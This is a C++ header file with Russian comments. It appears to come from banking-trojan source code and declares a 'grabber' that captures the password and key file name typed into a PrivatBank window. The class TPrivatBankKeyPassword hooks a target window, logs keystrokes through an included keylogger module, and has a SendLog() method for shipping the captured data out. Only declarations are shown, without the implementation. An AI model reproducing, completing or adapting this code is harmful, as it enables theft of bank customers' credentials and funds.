//---------------------------------------------------------------------------
//  Грабер пароля ключа приватбанка
//---------------------------------------------------------------------------

#ifndef PrivatBankKeyPassH
#define PrivatBankKeyPassH
//---------------------------------------------------------------------------

#include <windows.h>


#include "GetApi.h"
#include "Strings.h"
#include "KeyLogger.h"


namespace PrivatBankKeyPass
{
	//------------------------------------------------
	//  Initialize - Функция инициализирует грабер
	//				 пароля ключа приватбанка
	//------------------------------------------------
	bool Initialize(HWND Wnd, DWORD  WndClassHash);
}




//*****************************************************
//  Грабер пароля ключа приватбанка
//*****************************************************
class TPrivatBankKeyPassword : public TGrabber
{
private:
	HWND   FWnd;
	string FPassword;
	string FKeyFileName;
    void ParseFileName(const string& Text);
protected:
	void LogKeyboad(HWND aWnd, const char* Text);
public:
	TPrivatBankKeyPassword(HWND aWnd, const string& WndText);
	~TPrivatBankKeyPassword();

	bool SendLog();

	HWND inline Wnd() { return FWnd; }
};



//---------------------------------------------------------------------------
#endif
